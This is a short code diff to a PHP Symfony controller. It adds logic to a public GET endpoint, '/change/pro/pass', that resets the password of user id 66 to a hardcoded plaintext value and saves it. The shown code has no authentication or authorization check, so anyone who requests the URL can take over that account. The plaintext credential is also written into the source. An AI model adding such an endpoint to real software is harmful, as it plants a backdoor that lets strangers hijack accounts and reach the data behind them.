@@ -81,6 +81,9 @@ class GetRoleController extends AbstractController
     #[Route(path: '/change/pro/pass', name: 'change_pro_pass', methods: ['GET'])]
     public function change_pro_pass(): JsonResponse
     {
+        $user = $this->userRepository->find(66);
+        $user->setPassword('marsel2013');
+        $this->userRepository->save($user);
         return $this->json('Success');
     }
 
